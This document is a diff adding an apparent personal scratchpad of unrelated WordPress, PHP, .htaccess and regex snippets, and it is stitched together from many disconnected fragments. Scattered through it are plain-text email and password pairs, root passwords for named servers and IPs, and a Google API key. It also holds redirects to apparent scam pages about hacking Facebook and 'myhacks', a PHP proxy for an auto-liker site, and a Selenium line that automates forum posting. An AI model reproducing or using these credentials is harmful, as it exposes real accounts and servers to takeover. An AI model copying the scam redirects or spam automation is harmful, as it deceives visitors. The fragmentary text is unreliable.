@@ -1,0 +1,136 @@
+<?php
+
+header("HTTP/1.1 301 Moved Permanently");
+
+header("Location: ".get_bloginfo('url'));
+
+exit();
+
+?>
+
+
+define('DISABLE_WP_CRON', true);
+
+wget -q -O - https://tassco.org/wp-cron.php?doing_wp_cron >/dev/null 2>&1	
+
+================================================================
+<p>Also Read – <a href="https://hubsadda.com/5-ways-to-drive-organic-traffic-to-your-website/" target="_blank" rel="noreferrer noopener">5 Ways to Drive Organic Traffic to Your Website</a></p>
+
+<p>Also Read(.*)p>
+
+================================================================
+
+add_filter( 'use_widgets_block_editor', '__return_false' );
+
+Copy
+masifrock1@gmail.com
+Love@1234
+
+[Daman] Elfen Lied
+Darker Than Black Complete Series [BluRay]
+
+
+ns1.md-in-40.webhostbox.net
+ ns2.md-in-40.webhostbox.net
+
+ dns1.namecheaphosting.com
+ dns2.namecheaphosting.com
+
+namanjain@hellomail.gq 
+Naman@123
+
+whats92i_shot
+shot@123
+
+Chukapoka@123
+himanshu089
+
+Hostname: servers.kingliker.com
+
+Main IP: 63.142.250.96
+
+Root Password: 1838d5c05224
+<?php
+    $url = 'https://crazylikers.net/autoliker/';
+    $htm = file_get_contents($url);
+    echo $htm;
+?>
+
+ns1.b5dc.co.uk (185.112.248.43)
+ns2.b5dc.co.uk (185.112.248.43)
+
+ns1.l0l.review
+ns2.l0l.review
+
+RewriteEngine On
+RewriteCond %{HTTPS} !on
+RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI}
+
+
+  <?php 
+                                $timestamp = time(); 
+                                echo(date("F d, Y "));
+                                ?>
+								
+								
+								RewriteCond %{HTTPS} !=on
+RewriteRule ^(.*) https://%{SERVER_NAME}/$1 [R,L]
+
+
+
+
+RewriteCond %{HTTPS} !=on
+RewriteRule ^(.*) https://%{SERVER_NAME}/$1 [R,L]
+
+bitclinks.com
+
+            <meta content="noindex, nofollow" name="robot"/>
+
+RedirectMatch permanent .* https://fanlink.to/hack-facebook-online
+
+(Tool Updated : <?	
+$date = isset($_GET['date']) ? $_GET['date'] : date('Y-m-d');
+
+
+
+$m0 = date('d.m.y', strtotime($date .' -0 day'));
+$m00 = date('d F Y', strtotime($date .' -0 day'));
+
+
+
+echo $m00;
+
+?> )
+
+<script>
+window.location.href = "https://myhacks.art/8ce9aaf";
+</script>
+
+add_filter( ‘rank_math/frontend/add_ugc_attribute’, ‘__return_false’ );
+
+
+line break after 3 lines
+
+((?:[^\r\n]+(\R)){3}) - find
+$1$2 -replace
+
+less than char == ^.{0,10}$
+
+/** SSL */  
+define('FORCE_SSL_ADMIN', true);  
+// in some setups HTTP_X_FORWARDED_PROTO might contain  
+// a comma-separated list e.g. http,https  
+// so check for https existence  
+if (strpos($_SERVER['HTTP_X_FORWARDED_PROTO'], 'https') !== false)  
+    $_SERVER['HTTPS']='on';
+	
+	
+	abc = driver.find_element_by_id("forum_thread_posts_attributes_0_message")
+    driver.execute_script("arguments[0].value ='"+f+"'", abc)
+AIzaSyC3YoT0C0wSXNZPQzw8CPDw-xNlN0nLnzw
+
+
+
+
+User: root
+Password: xgJa8G35dL7gV
